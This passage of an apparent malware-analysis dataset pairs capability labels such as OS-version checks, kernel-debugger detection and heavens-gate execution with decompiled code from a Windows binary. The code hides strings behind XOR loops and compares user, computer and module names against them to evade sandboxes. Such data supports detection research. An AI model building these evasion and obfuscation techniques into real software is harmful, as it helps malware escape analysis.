(*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1249
    },
    "0040b4dd": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040b4dd(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t nSize;\n    uint32_t cbSid;\n    \n    *0x41dd7c = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41dd70 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41dd6c = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.0040b7aa();\n    fcn.0040b474();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41dda0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    if (*0x41dda0 != 0) {\n        nSize = 0x10;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41dda0, &nSize);\n        if (iVar4 == 0) {\n            var_24h = 0x43273432;\n            var_20h = 0x34297103;\n            var_1ch = 0x711f4326;\n            var_18h._0_2_ = 0x3467;\n            pIdentifierAuthority = 0x43693467;\n            var_ch._0_2_ = 29000;\n            uVar3 = (*pcVar2)(8, 0x1d);\n            iVar4 = (*pcVar1)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                if (iVar5 != 0xb45fcb) {\n                    cbSid = 6;\n                    *(iVar6 + iVar4) = *(&pIdentifierAuthority + iVar6 % 6) ^ (iVar6 + iVar4)[&var_24h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41dda0, iVar4);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        fcn.0040b100();\n    }\n    var_ch._0_2_ = 0x500;\n    pIdentifierAuthority = 0;\n    cbSid = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (cbSid != 0) {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &cbSid);\n        cbSid = cbSid & -(iVar4 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (cbSid != 0) {\n            if (*0x41dd70 < 6) {\n                return 0;\n            }\n            fcn.0040b757();\n            goto code_r0x0040b66e;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar1)(0, &pSid, &nSize);\n    }\ncode_r0x0040b66e:\n    if (5 < *0x41dd70) {\n        fcn.0040b687();\n    }\n    return 0;\n}\n",
        "token_count": 986
    },
    "0040f9f1": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040f9f1(uchar *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uchar *puVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != NULL) {\n        puVar8 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_8h = param_1;\n        cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar2 == '\\x05') {\n            var_28h = 0x6c20642b;\n            var_24h = 0x4f107809;\n            var_20h = 0x64196f1b;\n            var_1ch = 0x780a6c3d;\n            var_18h._0_2_ = 0x4f64;\n            var_14h = 0x6c4f6478;\n            var_10h._0_1_ = 0x6f;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_4h = 5;\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                if (iVar5 != 0x1113b6) {\n                    *(iVar6 + piVar4) = *(&var_14h + iVar6 % var_4h) ^ (iVar6 + piVar4)[&var_28h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x12);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_8h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            var_50h = 0x532d413c;\n            var_4ch = 0x42356f53;\n            var_48h = 0x410e3524;\n            var_44h = 0x6f505330;\n            var_40h = 0x3512421d;\n            var_3ch = 0x5332411f;\n            var_38h = 0x42206f71;\n            var_34h = 0x410e3527;\n            var_30h = 0x6f5a530e;\n            var_2ch = 0x35534236;\n            var_14h = 0x5342416f;\n            var_10h._0_1_ = 0x35;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_4h = 5;\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                if (iVar5 != 0xb6fb3e) {\n                    *(iVar6 + piVar4) = *(&var_14h + iVar6 % var_4h) ^ (iVar6 + piVar4)[&var_50h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x28);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_8h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 1118
    },
    "0040f998": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040f998(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 151
    },
    "00403bc2": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00403bc2(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.00403417(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0040f56a();\n    }\n    return iVar1;\n}\n",
        "token_count": 182
    },
    "0040b757": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.0040b757(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41dd70 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 176
    },
    "00404b59": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00404b59(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_d0h;\n    uint var_cch;\n    uint pcbBuffer;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t var_b4h;\n    int32_t var_b0h;\n    int32_t var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uint var_42h;\n    ushort var_3eh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uint var_3ah;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.004049af();\n    if (iVar4 != 0) {\n        fcn.00404b41();\n    }\n    var_14h = 0x2103251;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x34;\n    var_10h._2_2_ = 0x7e45;\n    var_ch._0_1_ = 0x13;\n    var_30h = 6;\n    var_ch._1_1_ = 6;\n    var_ch._2_1_ = 2;\n    var_ch._3_1_ = 0x58;\n    var_a8h = 0x6a775035;\n    var_a4h._0_2_ = 0x586e;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar11 = 0;\n    var_2ch = &var_14h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar6 != 0x743593) {\n            *(iVar11 + iVar4) = *(&var_a8h + iVar11 % var_30h) ^ (iVar11 + iVar4)[&var_14h - iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 != 0) {\n        fcn.00404b41();\n    }\n    var_14h = 0x542d261e;\n    var_10h._0_1_ = 0x2b;\n    var_10h._1_1_ = 1;\n    var_10h._2_2_ = 0x6a28;\n    var_ch._0_1_ = 0x55;\n    var_ch._1_1_ = 0x23;\n    var_ch._2_1_ = 1;\n    var_ch._3_1_ = 0x44;\n    var_88h = 0x3144446d;\n    var_84h._0_1_ = 0x4f;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_68h = 5;\n    iVar6 = 0;\n    var_a8h = iVar11;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar7 != 0x5e752) {\n            *(iVar6 + iVar11) = *(&var_88h + iVar6 % var_68h) ^ (iVar6 + iVar11)[&var_14h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 != 0) {\n        fcn.00404b41();\n    }\n    pcbBuffer = 0x400;\n    iVar11 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41dde0, &pcbBuffer);\n    if (iVar11 == 0) {\n        fcn.00404b41();\n    }\n    var_14h = 0x471f3c16;\n    var_10h._0_1_ = 0x3d;\n    var_10h._1_1_ = 0x2f;\n    var_10h._2_2_ = 0x1c21;\n    var_ch._0_1_ = 0x1e;\n    var_ch._1_1_ = 0x50;\n    var_ch._2_1_ = 0x2a;\n    var_ch._3_1_ = 0x41;\n    var_a0h = 0x356d4955;\n    var_9ch._0_2_ = 0x4158;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_88h = iVar11;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar7 != 0x90da9d) {\n            *(iVar6 + iVar11) = *(&var_a0h + iVar6 % var_30h) ^ (iVar6 + iVar11)[&var_14h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.00404b41();\n    }\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 0x56;\n    var_10h._2_2_ = 0x1c00;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 0x36;\n    var_ch._2_1_ = 0x22;\n    var_ch._3_1_ = 0x37;\n    var_98h = 0x786e375a;\n    var_94h._0_2_ = 0x5965;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_a0h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar7 != 0xa58e7e) {\n            *(iVar6 + iVar11) = *(&var_98h + iVar6 % var_30h) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.00404b41();\n    }\n    pcbBuffer = 0x400;\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41dde0, &pcbBuffer);\n    if (iVar11 == 0) {\n        fcn.00404b41();\n    }\n    var_10h._0_1_ = 0x62;\n    var_10h._1_1_ = 7;\n    var_10h._2_2_ = 0x2e18;\n    var_ch._0_1_ = 10;\n    var_ch._1_1_ = 0x7e;\n    var_ch._2_1_ = 0x1e;\n    var_ch._3_1_ = 0x56;\n    var_80h = 0x6a564631;\n    var_7ch._0_1_ = 0x48;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_98h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar7 != 0xf7a1) {\n            *(iVar6 + iVar11) = *(&var_80h + iVar6 % var_68h) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.00404b41();\n    }\n    var_10h._0_1_ = 0x5a;\n    var_10h._1_1_ = 5;\n    var_10h._2_2_ = 0x3823;\n    var_ch._0_1_ = 1;\n    var_ch._1_1_ = 0x1c;\n    var_ch._2_1_ = 0x2c;\n    var_ch._3_1_ = 0x56;\n    var_8h = 0x746a566d;\n    var_4h._0_2_ = 0x5557;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_80h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar7 != 0x509a85) {\n            *(iVar6 + iVar11) = *(&var_8h + iVar6 % var_30h) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.00404b41();\n    }\n    var_54h = 0x1326143e;\n    var_50h = 0x31073702;\n    var_4ch._0_1_ = 0xb;\n    var_4ch._1_1_ = 0x11;\n    var_4ch._2_1_ = 0x33;\n    var_4ch._3_1_ = 6;\n    var_48h = 0x37;\n    var_47h = 5;\n    var_46h = 0x1c;\n    var_45h = 0x26;\n    var_44h = 1;\n    var_43h = 0x3d;\n    var_42h._0_2_ = 0x1b18;\n    var_42h._2_1_ = 0x2a;\n    var_3eh = 0x240d;\n    var_3ch = 0x21;\n    var_3bh = 0x13;\n    var_3ah._0_1_ = 0x38;\n    var_3ah._1_1_ = 0x74;\n    var_8h = 0x57745576;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x55);\n    var_42h._3_1_ = var_4ch._3_1_;\n    uVar5 = (*pcVar2)(8, 0x1d);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_2ch = &var_54h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar7 != 0xba0028) {\n            *(iVar6 + iVar11) = *(&var_8h + iVar6 % var_68h) ^ (iVar6 + iVar11)[&var_54h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1c);\n    var_1ch = 0x42160a04;\n    var_18h = 0xc313a2f;\n    var_14h = 0x16013959;\n    var_10h._0_1_ = 0x17;\n    var_10h._1_1_ = 0x45;\n    var_10h._2_2_ = 0x3823;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 0x65;\n    var_8h = 0x36657357;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4a);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c4h = &var_1ch - iVar6;\n    var_2ch = iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        puVar9 = extraout_ECX;\n        if (iVar8 != 0xe69367) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_8h + iVar7 % var_68h) ^ puVar9[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x12);\n    cVar3 = fcn.00404953(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.00404b41();\n    }\n    var_8h = 0x15040738;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x70);\n    var_28h = 0x354d4a79;\n    var_24h._0_2_ = 0x4b70;\n    uVar5 = (*pcVar2)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c4h = iVar6;\n    var_c0h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar8 != 0x8da02) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_8h = 0x1c762112;\n    var_4h._0_2_ = 0x3331;\n    var_28h = 0x54356e50;\n    var_24h._0_2_ = 0x3362;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c0h = iVar6;\n    var_bch = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar8 != 0x2ab2a7) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 6);\n    var_8h = 0x11040b3d;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x49);\n    var_28h = 0x494b496b;\n    var_24h._0_2_ = 0x4949;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_bch = iVar6;\n    var_b8h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar8 != 0x530e60) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_8h = 0x2f3b1039;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x66);\n    var_28h = 0x7a765568;\n    var_24h._0_2_ = 0x7466;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b8h = iVar6;\n    var_b4h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar8 != 0x686c29) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_8h = 0x7f153f62;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6c);\n    var_28h = 0x36567231;\n    var_24h._0_2_ = 0x416c;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b4h = iVar6;\n    var_b0h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar8 != 0xc141a5) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_1ch = 0x17663b31;\n    var_18h = 0x1f555839;\n    var_14h = 0x41484372;\n    var_10h._0_1_ = 2;\n    var_10h._1_1_ = 0x62;\n    var_10h._2_2_ = 0x4845;\n    var_ch._0_1_ = 0x75;\n    var_8h = 0x52327578;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x75);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b0h = iVar6;\n    var_ach = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar8 != 0xdbde9c) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_68h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x11);\n    var_10h._0_1_ = 5;\n    var_10h._1_1_ = 0x60;\n    var_10h._2_2_ = 0x231a;\n    var_ch._0_1_ = 0x18;\n    var_ch._1_1_ = 0x7a;\n    var_ch._2_1_ = 0x43;\n    var_8h = 0x77543443;\n    var_4h._0_2_ = 0x4b35;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_ach = iVar6;\n    var_34h = &var_10h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar8 != 0x730833) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 7);\n    var_28h = 0x10c0415;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x53);\n    var_70h = 0x48424b46;\n    var_6ch._0_2_ = CONCAT11(var_6ch._1_1_, 0x53);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_34h = &var_28h - iVar6;\n    var_8h = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar8 != 0x1d3b72) {\n            *(iVar7 + iVar6) = *(&var_70h + iVar7 % var_68h) ^ (iVar7 + iVar6)[&var_28h - iVar6];\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    *0x41e1f0 = var_c4h;\n    *0x41e1f8 = var_c0h;\n    *0x41e1fc = var_bch;\n    *0x41e200 = var_b8h;\n    *0x41e204 = var_b4h;\n    uVar10 = 0;\n    *0x41e208 = var_b0h;\n    *0x41e20c = var_ach;\n    *0x41e210 = iVar6;\n    do {\n        iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, *(uVar10 + 0x41e1f0));\n        if (iVar6 != 0) {\n            fcn.00404b41();\n        }\n        uVar10 = uVar10 + 4;\n    } while (uVar10 < 0x20);\n    var_1ch = 0x20160138;\n    var_18h = 0x707120a;\n    var_14h = 0x22001301;\n    var_10h._0_1_ = 0x1d;\n    var_10h._1_1_ = 1;\n    var_10h._2_2_ = 0x2b1d;\n    var_ch._0_1_ = 0x65;\n    var_70h = 0x4572686e;\n    var_6ch._0_2_ = 0x5065;\n    uVar5 = (*pcVar2)(8, 0x12);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_34h = &var_1ch - iVar6;\n    var_28h = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        puVar9 = extraout_ECX_00;\n        if (iVar8 != 0x50610c) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_70h + iVar7 % var_30h) ^ puVar9[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x11);\n    cVar3 = fcn.00404953(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.00404b41();\n    }\n    var_14h = 0x43012632;\n    var_10h._0_1_ = 0x39;\n    var_10h._1_1_ = 5;\n    var_10h._2_2_ = 0x3123;\n    var_ch._0_1_ = 0x58;\n    var_ch._1_1_ = 0x34;\n    var_ch._2_1_ = 100;\n    var_78h = 0x37734f64;\n    var_74h._0_1_ = 0x4c;\n    uVar5 = (*pcVar2)(8, 0xc);\n    iVar6 = 